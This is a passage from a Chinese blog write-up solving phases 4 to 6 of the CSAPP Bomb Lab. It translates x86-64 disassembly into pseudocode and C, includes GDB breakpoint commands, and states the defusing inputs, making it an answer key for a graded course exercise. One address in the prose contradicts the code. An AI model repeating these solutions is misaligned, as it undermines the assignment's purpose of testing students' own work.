$0xe,0x8(%rsp)0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;:    test   %eax,%eax0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp0x0000000000401061 &lt;+85&gt;:    ret</code></pre><p>这一关主要分成两个函数：phase_4 和 func_4，首先查看 phase_4，代码前一段和 phase_3 非常类似：读取两个整数，且保证输入的第一个值位于区间 <code>[0, 15)</code> 内。</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax !&#x3D; 2) &#123;    explode_bomb();&#125;if (Mem[%rsp + 8] &gt;&#x3D; 15u) &#123;explode_bomb();&#125;%edx &#x3D; 0xe;%esi &#x3D; 0;%edi &#x3D; Mem[%rsp + 8];func4(%rdi, %rsi, %rdx); &#x2F;&#x2F; func4(Mem[%rsp+8], 0, 14)if (%eax !&#x3D; 0) &#123;    explode_bomb();&#125;if (Mem[%rsp + 12] !&#x3D; 0) &#123;    explode_bomb();&#125;</code></pre><p>后一段便是传递 3 个参数给函数 func_4 进行调用，需要保证返回值和输入的第二个数为 0，因此密码的第二个数为 0。可以看到，phase_4 的代码结构还是很简单易懂的，关键是对 func_4 函数的分析。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax0x0000000000400fdd &lt;+15&gt;:    sar    %eax0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp0x000000000040100b &lt;+61&gt;:    ret</code></pre><p>仔细观察 func_4 的代码，发现含有对 func_4 的调用，因此 func_4 是一个 <strong>递归</strong> 函数。在对递归函数进行翻译时，本质上与普通的函数并没有区别，结果如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> c <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span>res <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>    res <span class="token operator">+=</span> temp<span class="token punctuation">;</span>    res <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>    temp <span class="token operator">=</span> b <span class="token operator">+</span> res<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">></span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        c <span class="token operator">=</span> temp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            b <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> res <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以看到，程序的逻辑还是比较复杂的，但是注意到参数 b 和 c 的值都是确定的，真正的变量只有参数 a。因此这里有一个偷懒的办法：将程序翻译为一个语法严格正确的高级语言程序（而不是之前的伪代码），然后枚举所有可能的 a（只有 15 中情况），运行测试即可，结果为 0 的即为满足要求的值，也就是密码的第一个数。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p4.png" alt></p><p>可见，本关的正解同样不止一个，<code>1 0</code>、<code>3 0</code>、<code>7 0</code> 都是正确答案。</p><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401062 &lt;+0&gt;:     push   %rbx0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp0x00000000004010f2 &lt;+144&gt;:   pop    %rbx0x00000000004010f3 &lt;+145&gt;:   ret</code></pre><p>这一关的汇编代码逻辑不算复杂，我们主要关注翻译后的代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rbx &#x3D; %rdi;Mem[%rsp + 0x18] &#x3D; Mem[%fs + 0x28]; &#x2F;&#x2F; 4Byte%eax ^&#x3D; %eax;  &#x2F;&#x2F; %eax &#x3D; 0if (string_length() !&#x3D; 6) &#123;explode_bomb();&#125;for (%eax &#x3D; 0; %eax !&#x3D; 6; ++%eax) &#123;    %edx &#x3D; Mem[%rbx + %rax] &amp; 0xf;    Mem[%rsp + %rax + 0x10] &#x3D; Mem[0x4024b0 + %rdx]; &#x2F;&#x2F; 1Byte&#125;Mem[%rsp + 0x16] &#x3D; 0;%esi &#x3D; 0x40245e;%rdi &#x3D; %rsp + 0x10;if (string_not_equal(%rdi, %esi) !&#x3D; 0) &#123;explode_bomb();&#125;%rax &#x3D; Mem[%rsp + 0x18] ^ Mem[%fs + 0x28];if (%rax !&#x3D; 0) &#123;__stack_chk_fail();&#125;</code></pre><p>从 <code>if (string_length() != 6) explode_bomb();</code> 可以看出密码是一个长度为 6 的字符串，随后的 <code>for</code> 循环遍历字符串的各个字符，提取低一字节的值 <code>%edx</code>，将其作为相对于地址 <code>0x4024b0</code> 的偏移量，读取目标地址 <code>0x4020b0 + %rdx</code> 处的低 4 位数据，存入地址 <code>%rsp + %rax + 0x10</code> 处，构造出一个起始地址为 <code>%rsp + 0x10</code> 的长度为 6 的字符串。然后将起始地址为 <code>%rsp + 0x10</code> 的字符串与起始地址为 <code>0x40245e</code> 的字符串作比较，如果不相同，则“引爆炸弹”。最后进行缓冲区溢出检测，如果溢出，则调用 <code>__stack_chk_fail()</code>.</p><p>经过以上的描述，不难看出输入的 6 位字符串其实是一个相对于数组 <code>0x4024b0</code> 的索引，只不过索引值不直接给出，而是等于字符的低 4 位值。本关的目标便是使得输入的 6 位索引经过映射之后得到的字符串正好等于地址 <code>0x40245e</code> 的字符串，即 \”flyers\”.</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p5.png" alt></p><p>以字符 <em>f</em> 为例，<em>f</em> 在 array 表中的（最小）索引为 9，而所有低 4 位等于 9（1001）的字符都满足条件，例如 <em>i</em> .</p><div class="table-container"><table><thead><tr><th style="text-align:center">字符c1</th><th style="text-align:center">索引</th><th style="text-align:center">字符c2</th></tr></thead><tbody><tr><td style="text-align:center">f</td><td style="text-align:center">9</td><td style="text-align:center">i</td></tr><tr><td style="text-align:center">l</td><td style="text-align:center">15</td><td style="text-align:center">o</td></tr><tr><td style="text-align:center">y</td><td style="text-align:center">14</td><td style="text-align:center">n</td></tr><tr><td style="text-align:center">e</td><td style="text-align:center">5</td><td style="text-align:center">e</td></tr><tr><td style="text-align:center">r</td><td style="text-align:center">6</td><td style="text-align:center">f</td></tr><tr><td style="text-align:center">s</td><td style="text-align:center">7</td><td style="text-align:center">g</td></tr></tbody></table></div><p>依次类推，一个满足条件的密码为：<em>ionefg</em> .</p><h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>最复杂的一关，代码量非常大，而且逻辑比较复杂，整体观察比较困难，可以先将代码按照循环块拆分为几个部分，依次进行分析。</p><p>在使用 GDB 调试的时候，可以为每个块的起始部分分别打上断点，同时为了调试的方便，可将这些命令写入 <code>.gdbinit</code> 中。</p><pre class="language-shell" data-language="shell"><code class="language-shell">b phase_6b *0x401153b *0x40116fb *0x4011abb *0x4011d2r .&#x2F;ans.txt</code></pre><h2 id="block-1"><a href="#block-1" class="headerlink" title="block_1"></a>block_1</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r140x00000000004010f6 &lt;+2&gt;:     push   %r130x00000000004010f8 &lt;+4&gt;:     push   %r120x00000000004010fa &lt;+6&gt;:     push   %rbp0x00000000004010fb &lt;+7&gt;:     push   %rbx0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r130x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r140x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;:    add    $0x4,%r130x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</code></pre><p>第一部分整体而言不算太复杂，直接查看翻译后的代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 读取6个4Byte数字放入从%r14寄存器指向地址开始的内存空间中%r13 &#x3D; %rsp;%rsi &#x3D; %rsp;read_six_numbers();%r14 &#x3D; %rsp;for (%r12d &#x3D; 0; %r12 !&#x3D; 6; ) &#123;%rbp &#x3D; %r13;    %eax &#x3D; Mem[%r13];    %eax -&#x3D; 1;    if (%eax &gt; 5u) &#123;        explode_bomb();    &#125;    %r12d +&#x3D; 1;    if (%r12d &#x3D;&#x3D; 6) break;    for (%ebx &#x3D; %r12d; %ebx &lt;&#x3D; 5; ++%ebx) &#123;        %rax &#x3D; %ebx;  &#x2F;&#x2F; 符号扩展        %eax &#x3D; Mem[4 * %rax + %rsp];        if (Mem[%rbp] &#x3D;&#x3D; %eax) &#123;            explode_bomb();        &#125;&#125;%r13 +&#x3D; 4;&#125;</code></pre><p>与 phase_2 类似，首先读取 6 个数字，确定密码由 6 个数字组成。</p><p>随后主要关注循环中导致触发 <code>explode_bomb</code> 的条件，这些条件指明了密码的限定范围。第一个是 <code>%eax &gt; 5u</code>，注意前一条指令是 <code>%eax</code> 自减一，因此可以确定 6 个数字的范围都是 <code>[1, 6]</code>.</p><blockquote><p>这里自减一很有意思，刚开始看可能以为是多此一举，直接判断 %eax 是否大于 6u 不就完了吗？但是考虑到 0 这个特例，它在自减一后得到 -1，而 -1 满足无符号比较大于 5u，因此被排除在外。如果直接判断 %eax 是否大于 6u，那么数字的限定范围就变成了 [0, 6].</p></blockquote><p>后面的内层循环不难看出是用来判重的，因此六个数字的范围得以确定：每个数字都位于区间 <code>[1, 6]</code> 内且无重复数字。</p><h2 id="block-2"><a href="#block-2" class="headerlink" title="block_2"></a>block_2</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; %r14 &#x3D; %rsp&#x2F;&#x2F; 遍历6个数字，每个数字num的值变为7-num%ecx &#x3D; 7;for (%rax &#x3D; %r14, %rsi &#x3D; %rsp + 0x18; %rax !&#x3D; %rsi; %rax +&#x3D; 4) &#123;%edx &#x3D; %ecx - Mem[%rax];Mem[%rax] &#x3D; %edx;&#125;</code></pre><p>第二部分非常简单，遍历输入的 6 个数字，将每个数字 num 更改为 7 - num.</p><h2 id="block-3"><a href="#block-3" class="headerlink" title="block_3"></a>block_3</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</code></pre><p>第三部分虽然代码量不大，但是跳转语句很多，逻辑非常复杂。这里我采用了分部的方式，首先改写为带 goto 语句的高级语言伪代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;goto phase_6_163;phase_6_130:%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;if (%eax !&#x3D; %ecx) goto phase_6_130;goto phase_6_148;phase_6_143:%edx &#x3D; 0x6032d0;phase_6_148:Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;if (%rsi &#x3D;&#x3D; 0x18) goto phase_6_183;phase_6_163:%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &lt;&#x3D; 1) goto phase_6_143;%eax &#x3D; 1;%edx &#x3D; 0x6032d0;goto phase_6_130;</code></pre><p>然后对照一些常见的形式 goto 改写为循环语句，这里的翻译过程比较繁琐，需要静下来仔细思考。</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;while (%rsi !&#x3D; 0x18) &#123;%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &gt; 1) &#123;%eax &#x3D; 1;%rdx &#x3D; 0x6032d0;while (%eax !&#x3D; %ecx) &#123;%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;&#125;&#125;else &#123;%edx &#x3D; 0x6032d0;&#125;Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;&#125;</code></pre><p>观察翻译后的代码，似乎和 phase_5 类似，遍历每个数字，并将每个数字当作索引 i，在起始地址为 <code>0x6032d0</code> 的表中查找第 i 个元素，以 <code>%rsp + 0x20</code> 作为起始地址创建一个线性结构。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p6.png" alt></p><p>打印起始地址为 <code>0x6032d0</code> 的 12 个 8 字节数据，可以看到第二列中表示的值就是某一行的地址，且这些地址正好可以串联成一个线性结构，加上符号名 \”node\” 的提示，是不是很熟悉？没错，就是 <strong>链表</strong> 。上图每一行的第一列为值域，第二列为 next 域。</p><p>回过来观察代码，第三部分的作用就是将输入的六个数字作为索引，创建一个数组，每个数组元素都为索引对应的 next 域。</p><h2 id="block-4"><a href="#block-4" class="headerlink" title="block_4"></a>block_4</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 创建链表%rbx &#x3D; Mem[%rsp + 0x20];for (%rax &#x3D; %rsp + 0x28, %rsi &#x3D; %rsp + 0x50; ; %rcx &#x3D; %rdx) &#123;%rcx &#x3D; %rbx;%rdx &#x3D; Mem[%rax];Mem[%rcx + 8] &#x3D; %rdx;%rax +&#x3D; 8;if (%rax &#x3D;&#x3D; %rsi) break;&#125;</code></pre><p>理解清楚了第三部分，第四部分的作用就很明显了：根据第三部分创建的由 next 域构成的数组，创建一个链表结构。</p><h2 id="block-5"><a href="#block-5" class="headerlink" title="block_5"></a>block_5</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp0x00000000004011fb &lt;+263&gt;:   pop    %rbx0x00000000004011fc &lt;+264&gt;:   pop    %rbp0x00000000004011fd &lt;+265&gt;:   pop    %r120x00000000004011ff &lt;+267&gt;:   pop    %r130x0000000000401201 &lt;+269&gt;:   pop    %r140x0000000000401203 &lt;+271&gt;:   ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 遍历链表，判断是否从大到小排序，若不是，则引爆Mem[%rdx + 8] &#x3D; 0;for (%ebp &#x3D; 5; %ebp !&#x3D; 0; --%ebp) &#123;%rax &#x3D; Mem[%rbx + 8];    %eax &#x3D; Mem[%rax];    if (Mem[%rbx] &lt; %eax) &#123;        explode_bomb();    &#125;   %rbx &#x3D; Mem[%rbx + 8];&#125;</code></pre><p>终于到最后一部分了，这一部分的作用很明显：判断链表是否有序，更准确地说，是否以非递增顺序排列。</p><p>那么本关的目标终于浮出水面了：</p><p><em>输入六个数字，对于每个数字 num，将 7 - num 作为索引，根据链表 node 重构出一个新的链表，并保证重构的链表按非递增顺序排列。</em></p><p>注意链表值域的比较只关注低 4 字节，因此链表各结点值域从大到小排序为：<code>3 4 5 6 1 2</code>，那么对应的输入数字为：<code>4 3 2 1 6 5</code>，即本关的正确答案。</p><h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h1><p>解决隐藏关卡首先要解决的问题是：如何进入？观察 main 函数的汇编代码，在结束 phase_6 之后、main 函数返回之前，只有 phase_defused 函数被调用，看来入口可能隐藏在一直以来被忽略的部分。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-4.png" alt></p><p>对 phase_defused 进行反汇编，结果如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r80x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp0x0000000000401658 &lt;+148&gt;:   ret</code></pre><p>和之前的做法一样，将汇编代码翻译为 C 语言风格的伪代码，同时打印程序中用到的一些字符串：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp.png" alt></p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rax &#x3D; Mem[%fs + 0x28];Mem[%rsp + 0x68] &#x3D; %rax;if (Mem[%rip + 0x202181] &#x3D;&#x3D; 6) &#123; &#x2F;&#x2F; num_input_strings%r8 &#x3D; %rsp + 0x10;%rcx &#x3D; %rsp + 0xc;%rdx &#x3D; %rsp + 0x8;%rdi &#x3D; 0x603870;sscanf(%rdi, &quot;%d %d %s&quot;, %rdx, %rcx, %r8);if (%eax &#x3D;&#x3D; 3) &#123;%rdi &#x3D; %rsp + 0x10;if 